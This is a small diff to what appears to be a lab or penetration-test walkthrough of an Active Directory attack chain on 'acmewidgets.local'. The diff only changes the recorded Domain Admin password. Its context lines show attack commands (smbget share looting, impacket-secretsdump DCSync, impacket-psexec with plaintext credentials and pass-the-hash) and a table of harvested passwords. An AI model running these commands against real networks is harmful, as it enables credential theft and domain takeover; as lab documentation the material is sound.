@@ -66,7 +66,7 @@ smbget -R smb://172.16.2.20/sensitive -U svc_backup%Backup2024
 cat passwords.txt
 ```
 
-**Found:** `Domain Admin: Adm1n2024!`
+**Found:** `Domain Admin: Adm1n2024`
 
 ---
 
@@ -95,7 +95,7 @@ impacket-secretsdump 'acmewidgets.local/svc_backup:Backup2024@172.16.2.10'
 ## Phase 6: Domain Admin
 ```bash
 # Option 1: Use password from file
-impacket-psexec 'acmewidgets.local/Administrator:Adm1n2024!@172.16.2.10'
+impacket-psexec 'acmewidgets.local/Administrator:Adm1n2024@172.16.2.10'
 
 # Option 2: Pass-the-Hash (use hash from DCSync)
 impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:<NTLM> Administrator@172.16.2.10
@@ -124,7 +124,7 @@ SQLi → Creds → SMB → Files → Domain Admin
 | jsmith | Summer2024 | AD User, SMB |
 | mwilliams | Welcome123 | AD User, Accounting share |
 | svc_backup | Backup2024 | AD User, Sensitive share, **DCSync** |
-| Administrator | Adm1n2024! | **Domain Admin** |
+| Administrator | Adm1n2024 | **Domain Admin** |
 
 ---
 
